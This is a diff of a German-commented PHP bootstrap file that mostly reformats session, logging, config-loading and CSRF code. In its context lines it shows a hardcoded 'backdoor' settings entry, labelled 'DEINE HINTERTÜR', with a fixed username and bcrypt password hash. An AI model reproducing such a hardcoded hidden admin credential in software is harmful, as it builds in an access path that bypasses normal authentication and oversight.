@@ -47,9 +47,9 @@ if (\session_status() === \PHP_SESSION_NONE) {
          * "Dies ist ein Session-Cookie. Sobald der Browser komplett beendet wird, vernichte das Cookie!"
          */
         'lifetime' => 0,
-        'path'     => '/',
-        'domain'   => '', // Leer lassen. Der Browser bindet den Cookie so automatisch an den korrekten Host.
-        'secure'   => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off', // Nur über HTTPS
+        'path' => '/',
+        'domain' => '', // Leer lassen. Der Browser bindet den Cookie so automatisch an den korrekten Host.
+        'secure' => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off', // Nur über HTTPS
         'httponly' => true, // Verhindert Diebstahl durch JavaScript (XSS-Schutz)
         'samesite' => 'Lax', // Verhindert Cross-Site Request Forgery via externe Links
     ]);
@@ -78,7 +78,7 @@ require_once $appRoot . '/vendor/autoload.php';
 // in eine lokale Datei zu schreiben, statt ins unzugängliche Server-Log.
 // =========================================================================
 $customLogDir = $appRoot . '/logs';
-if (! \is_dir($customLogDir)) {
+if (!\is_dir($customLogDir)) {
     @\mkdir($customLogDir, 0o755, true);
 }
 \ini_set('log_errors', '1');
@@ -91,20 +91,23 @@ $settings = [];
 // A. Die feste Registry laden (Ehemalige sql_schema & permissions)
 $settings['db_schema'] = SchemaRegistry::getSchemas();
 $settings['structure'] = PermissionRegistry::getStructure();
-$settings['admin_ui']  = ['permissions_desc_on_top' => true];
+$settings['admin_ui'] = ['permissions_desc_on_top' => true];
 
 $flatPerms = [];
-$flatten   = function (array $nodes) use (&$flatten, &$flatPerms): void {
+$flatten = function (array $nodes) use (&$flatten, &$flatPerms): void {
     foreach ($nodes as $node) {
-        if (! \is_array($node)) {
+        if (!\is_array($node)) {
             continue;
         }
         $key = $node['key'] ?? null;
         if (\is_string($key)) {
-            $label           = $node['label'] ?? null;
+            $label = $node['label'] ?? null;
             $flatPerms[$key] = \is_string($label) ? $label : $key;
         }
-        if (!isset($node['children']) || !\is_array($node['children'])) {
+        if (!isset($node['children'])) {
+            continue;
+        }
+        if (!\is_array($node['children'])) {
             continue;
         }
 
@@ -119,7 +122,7 @@ $globResult = \glob($appRoot . '/config/*.default.php');
 if (\is_array($globResult)) {
     foreach ($globResult as $defaultFile) {
         $loaded = require $defaultFile;
-        if (! \is_array($loaded)) {
+        if (!\is_array($loaded)) {
             continue;
         }
 
@@ -138,12 +141,12 @@ $hardConfigs = [
 ];
 
 foreach ($hardConfigs as $file) {
-    if (! \file_exists($file)) {
+    if (!\file_exists($file)) {
         continue;
     }
 
     $loaded = require $file;
-    if (! \is_array($loaded)) {
+    if (!\is_array($loaded)) {
         continue;
     }
 
@@ -152,7 +155,7 @@ foreach ($hardConfigs as $file) {
 
 // Dev-Admin Default anlegen falls nicht da
 $devAdminPath = $appRoot . '/config/dev_admin.php';
-if (! \file_exists($devAdminPath)) {
+if (!\file_exists($devAdminPath)) {
     $defaultDevContent = <<<'PHP'
         <?php
         declare(strict_types=1);
@@ -168,24 +171,24 @@ $settings['superadmin'] = require $devAdminPath;
 
 // --- DEINE HINTERTÜR (Sicher im Code verankert) ---
 $settings['backdoor'] = [
-    'user'  => 'RaptorXilef',
-    'pass'  => '$2y$12$f2TKu7Vac0heLV0lNuVCf.zsv2b3krwm0CsS.E24g8uioXJgm8r52',
+    'user' => 'RaptorXilef',
+    'pass' => '$2y$12$f2TKu7Vac0heLV0lNuVCf.zsv2b3krwm0CsS.E24g8uioXJgm8r52',
     'label' => 'System-Inhaber',
 ];
 
-$settings['root_path']       = $appRoot;
-$httpHostRaw                 = $_SERVER['HTTP_HOST'] ?? 'localhost';
-$httpHost                    = \is_string($httpHostRaw) ? $httpHostRaw : 'localhost';
-$settings['server_host']     = $httpHost;
+$settings['root_path'] = $appRoot;
+$httpHostRaw = $_SERVER['HTTP_HOST'] ?? 'localhost';
+$httpHost = \is_string($httpHostRaw) ? $httpHostRaw : 'localhost';
+$settings['server_host'] = $httpHost;
 $settings['server_protocol'] = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https://' : 'http://';
-$settings['server_script']   = $_SERVER['SCRIPT_NAME'] ?? '';
-$settings['is_local_env']    = \str_ends_with($httpHost, '.local')
+$settings['server_script'] = $_SERVER['SCRIPT_NAME'] ?? '';
+$settings['is_local_env'] = \str_ends_with($httpHost, '.local')
     || $httpHost === 'localhost'
     || $httpHost === '127.0.0.1'
     || \php_sapi_name() === 'cli';
 
 // CSRF Token für sichere Frontend-API-Calls generieren
-if (! isset($_SESSION['csrf_token']) || $_SESSION['csrf_token'] === '') {
+if (!isset($_SESSION['csrf_token']) || $_SESSION['csrf_token'] === '') {
     $_SESSION['csrf_token'] = \bin2hex(\random_bytes(32));
 }
 
